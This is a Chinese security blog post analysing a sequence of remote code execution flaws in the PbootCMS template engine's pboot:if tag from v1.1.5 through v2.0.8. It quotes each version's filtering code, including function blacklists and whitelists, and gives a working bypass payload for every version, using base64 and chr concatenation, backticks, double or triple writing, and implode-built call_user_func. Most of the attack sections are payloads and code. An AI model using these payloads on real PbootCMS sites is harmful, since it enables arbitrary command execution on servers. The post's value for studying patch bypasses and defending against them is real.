# PbootCMS任意代码执行的前世今生

阅读量 **217246**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-08-04 10:30:47

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01ec42e56da52a926f.jpg)

## PbootCMS (v1.1.5及其以下)

###  漏洞复现

![](https://p5.ssl.qhimg.com/t01b698669488e0883c.png)

    
    
    poc:
    {pboot:if(system(whoami))}{/pboot:if}
    

###  漏洞分析

漏洞点位于`/apps/home/controller/ParserController.php`

    
    
        public function parserIfLabel($content)
        {
            $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
            $pattern2 = '/pboot:([0-9])+if/';
            if (preg_match_all($pattern, $content, $matches)) {
                $count = count($matches[0]);
                for ($i = 0; $i < $count; $i ++) {
                    $flag = '';
                    $out_html = '';
                    // 对于无参数函数不执行解析工作
                    if (preg_match('/[\w]+\(\)/', $matches[1][$i])) {
                        continue;
                    }
                    eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
                    ......
    

这里有通过两个正则表达式后即可进入`eval`函数且`$content`是可控的  
第一个正则表达式限制格式格式必须为`{pboot:if(payload)}{/pboot:if}`形式  
第二个正则表达式不允许出现字母后面加`()`的情况，如`phpinfo()`  
这里很好绕过，比如`phpinfo(1)`，`system(任意命令)`

## PbootCMS (v1.1.6-v1.1.8)

###  漏洞分析

从`1.1.6`对之前存在的任意代码执行漏洞进行了修补，增加了部分函数黑名单，代码如下

    
    
    public function parserIfLabel($content)
        {
            $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
            $pattern2 = '/pboot:([0-9])+if/';
            if (preg_match_all($pattern, $content, $matches)) {
                // IF语句需要过滤的黑名单
                $black = array(
                    'chr',
                    'phpinfo',
                    'eval',
                    'passthru',
                    'exec',
                    'system',
                    'chroot',
                    'scandir',
                    'chgrp',
                    'chown',
                    'shell_exec',
                    'proc_open',
                    'proc_get_status',
                    'error_log',
                    'ini_alter',
                    'ini_set',
                    'ini_restore',
                    'dl',
                    'pfsockopen',
                    'syslog',
                    'readlink',
                    'symlink',
                    'popen',
                    'stream_socket_server',
                    'putenv',
                    'unlink',
                    'path_delete',
                    'rmdir',
                    'session',
                    'cookie',
                    'mkdir',
                    'create_dir',
                    'create_file',
                    'check_dir',
                    'check_file'
                );
                $count = count($matches[0]);
                for ($i = 0; $i < $count; $i ++) {
                    $flag = '';
                    $out_html = '';
                    $danger = false;
                    foreach ($black as $value) {
                        if (preg_match('/' . $value . '([\s]+)?\(/i', $matches[1][$i])) {
                            $danger = true;
                            break;
                        }
                    }
                    // 如果有危险字符，则不解析该IF
                    if ($danger) {
                        continue;
                    }
    
                    eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
    

显然黑名单有漏网之鱼，但是由于将单引号、双引号都进行了`html`实体转义让很多函数不能使用，但是依然有可以用的，如`base64_decode`，反引号等

    
    
    payload1
    {pboot:if(1);$a=base64_decode(c3lzdGVt);$a(whoami);//)}{/pboot:if}
    

![](https://p4.ssl.qhimg.com/t01a0f4fe04ccaf7009.png)

    
    
    payload2
    {pboot:if(var_dump(`whoami`))}{/pboot:if}
    

![](https://p5.ssl.qhimg.com/t01f0b8fef9ebce5564.png)

## PbootCMS(v1.1.9-v1.3.2)

发现黑名单有不足于是改成了白名单，代码如下

    
    
    public function parserIfLabel($content)
        {
            $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
            $pattern2 = '/pboot:([0-9])+if/';
            if (preg_match_all($pattern, $content, $matches)) {
                $count = count($matches[0]);
                for ($i = 0; $i < $count; $i ++) {
                    $flag = '';
                    $out_html = '';
                    $danger = false;
    
                    $white_fun = array(
                        'date'
                    );
    
                    // 不允许执行带有函数的条件语句
                    if (preg_match_all('/([\w]+)([\s]+)?\(/i', $matches[1][$i], $matches2)) {
                        foreach ($matches2[1] as $value) {
                            if (function_exists($value) && ! in_array($value, $white_fun)) {
                                $danger = true;
                                break;
                            }
                        }
                    }
    
                    // 如果有危险字符，则不解析该IF
                    if ($danger) {
                        continue;
                    } else {
                        $matches[1][$i] = decode_string($matches[1][$i]); // 解码条件字符串
                    }
    
                    eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
                    ......
    

如果我们能绕过`function_exists`的检测就行了网上有师傅给了如下绕过思路

![](https://p4.ssl.qhimg.com/t01caa74bbc2fc53f6d.png)

    
    
    payload1
    {pboot:if(syste\m(whoami));//)}{/pboot:if}
    

![](https://p2.ssl.qhimg.com/t0183c0195b8287a691.png)

    
    
    payload2
    {pboot:if(1);$a=$_GET[cmd];$a(whoami);//)}{/pboot:if}&cmd=system
    

![](https://p2.ssl.qhimg.com/t015e4eab6ae9d0999a.png)

后面的版本添加了正则匹配`eval`，其实也没啥用，上面两个`payload`一样可以用

## PbootCMS(v1.3.3-v2.0.2)

过滤了特殊字符导致使用非交互式直接执行任意代码的时代结束

![](https://p1.ssl.qhimg.com/t016edfc3868a395ac7.png)

然而留言部分任然存在任意代码执行，代码如下

    
    
    public function parserIfLabel($content)
        {
            $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
            $pattern2 = '/pboot:([0-9])+if/';
            if (preg_match_all($pattern, $content, $matches)) {
                $count = count($matches[0]);
                for ($i = 0; $i < $count; $i ++) {
                    $flag = '';
                    $out_html = '';
                    $danger = false;
    
                    $white_fun = array(
                        'date',
                        'in_array',
                        'explode',
                        'implode'
                    );
    
                    // 还原可能包含的保留内容，避免判断失效
                    $matches[1][$i] = $this->restorePreLabel($matches[1][$i]);
    
                    // 解码条件字符串
                    $matches[1][$i] = decode_string($matches[1][$i]);
    
                    // 带有函数的条件语句进行安全校验
                    if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)) {
                        foreach ($matches2[1] as $value) {
                            if ((function_exists($value) || preg_match('/^eval$/i', $value)) && ! in_array($value, $white_fun)) {
                                $danger = true;
                                break;
                            }
                        }
                    }
    
                    // 不允许从外部获取数据
                    if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)/i', $matches[1][$i])) {
                        $danger = true;
                    }
    
                    // 如果有危险函数，则不解析该IF
                    if ($danger) {
                        continue;
                    }
    
                    eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
    

禁止了外部数据的获取，白名单处的正则匹配不严谨，导致函数名+空格+()可以实现绕过

    
    
    payload
    {pboot:if(system (whoami))}{/pboot:if}
    

![](https://p1.ssl.qhimg.com/t01f79efe80d7c840c0.png)

## PbootCMS(v2.0.3)

增加了外部获取数据过滤部分，代码如下

    
    
    if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)/i', $matches[1][$i])) {
                        $danger = true;
                    }
    

并不影响我们使用`system`函数，提交上一个版本`payload`，发现`pboot:if`被删掉了  
  
在`apps/home/controller/IndexController.php`里第270行  
使用了将`pboot:if`替换为空

![](https://p5.ssl.qhimg.com/t01f70d52ac964fe718.png)

所以直接双写绕过

    
    
    payload
    {pbopboot:ifot:if(system (whoami))}{/pbpboot:ifoot:if}
    

![](https://p1.ssl.qhimg.com/t011b5a33b04a5c16a4.png)

## PbootCMS(v2.0.4-v2.0.7)

使用上一个版本`payload`，发下双写也被过滤了

![](https://p4.ssl.qhimg.com/t01e2ecb874cc0c306e.png)

改动的地方位于`/core/basic/Model.php`，增加了如下代码  
  
也就是再过滤了一次`pboot:if`，然而这种替换为空是根本没用的，于是三重写绕过，但是`v2.0.4`还增加了正则黑名单的过滤，禁用了`system`等函数，代码如下  
正则匹配黑名单加强，代码如下

    
    
    if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i', $matches[1][$i])) {
                        $danger = true;
                    }
    

发现漏掉了`assert`函数，没用过滤`chr`函数，所以直接拼接绕过

    
    
    payload
    {ppbopboot:ifot:ifboot:if(assert (chr (115).chr (121).chr (115).chr (116).chr (101).chr (109).chr (40).chr (119).chr (104).chr (111). chr (97).chr (109).chr (105).chr (41)))}{/pbpbopboot:ifot:ifoot:if}
    

![](https://p4.ssl.qhimg.com/t0146fc3fd94a7eb6f1.png)

## PbootCMS(v2.0.8)

从`v2.0.8`开始采用递归替换`pboot:if`，位于`/app/home/controller/MessageController.php`第61行

    
    
    $field_data = preg_replace_r('/pboot:if/i', '', $field_data);
    

跟进一下，位于`/core/function/handle.php`

    
    
    function preg_replace_r($search, $replace, $subject)
    {
        while (preg_match($search, $subject)) {
            $subject = preg_replace($search, $replace, $subject);
        }
        return $subject;
    }
    

这样就无法采用双写绕过了，正则表达式处改动了，导致函数+空格被过滤，代码如下

    
    
    if (preg_match_all('/([\w]+)([\s\\\\]+)?\(/i', $matches[1][$i], $matches2)) {
                        foreach ($matches2[1] as $value) {
                            if (function_exists($value) && ! in_array($value, $white_fun)) {
                                $danger = true;
                                break;
                            }
                        }
                    }
    

后台不会经过`preg_replace`函数的处理，使用的白名单里`implode`函数任然可以实现任意代码执行

    
    
    payload
    {pboot:if(implode('', ['c','a','l','l','_','u','s','e','r','_','f','u','n','c'])(implode('',['s','y','s','t','e','m']),implode('',['w','h','o','a','m','i'])))}{/pboot:if}
    

![](https://p4.ssl.qhimg.com/t013e1a3026189b38b0.png)

## 后记

`PbootCMS`的最新版本`v3.0.1`已经发布修复了该漏洞，从`v1.0.1`最开始的第一个版本到`v2.0.9`历时2年经过不断的漏洞修复，但是每次修复后就被绕过，不由得引发一系列反思

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ghtwf01** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/212603](/post/id/212603)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __5赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=GkpUC2gwwEgiaUgh4rMtdtw&s=40&t=1561479813)
ghtwf01

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

